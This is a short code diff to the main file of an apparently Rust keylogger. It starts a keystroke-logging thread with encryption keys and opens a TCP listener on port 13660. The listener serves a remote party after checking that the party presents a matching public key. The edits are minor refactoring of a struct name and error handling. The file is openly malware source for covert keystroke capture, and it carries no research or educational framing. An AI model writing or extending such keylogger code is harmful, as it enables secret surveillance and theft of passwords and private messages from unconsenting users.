@@ -13,7 +13,7 @@ const LOGS_FOLDER_PATH: &str = "./logs/";
 
 fn main() {
     let second_thread = std::thread::spawn(|| keylogger_lib::key_log(
-        &keylogger_lib::EncryptionType::Both { pub_key_loc: PUB_KEY_PATH.to_owned(), sym_key_loc: SYM_KEY_PATH.to_owned() }));
+        &keylogger_lib::EncryptionDetails { pub_key_loc: PUB_KEY_PATH.to_owned(), sym_key_loc: SYM_KEY_PATH.to_owned() }));
 
     let listener = std::net::TcpListener::bind("0.0.0.0:13660").expect("Listener Binding failed");
     //println!("listening started, ready to accept");
@@ -22,14 +22,14 @@ fn main() {
 
         // Check if server is actually the server by comparing public keys
         let mut pub_key_buffer: [u8; 32] = [0; 32];
-        if let Err(err) = stream.read(&mut pub_key_buffer) {
-            stream.write(b"Wrong Key");
+        if stream.read(&mut pub_key_buffer).is_err() {
+            stream.write(b"Wrong Key").is_ok();
             continue;
         }
         let mut local_pub_key_buffer: [u8; 32] = [0; 32];
-        std::fs::File::open(PUB_KEY_PATH).unwrap().read(&mut local_pub_key_buffer);
+        std::fs::File::open(PUB_KEY_PATH).unwrap().read(&mut local_pub_key_buffer).is_ok();
         if pub_key_buffer != local_pub_key_buffer {
-            stream.write(b"Wrong Key");
+            stream.write(b"Wrong Key").is_ok();
             continue;
         }
 
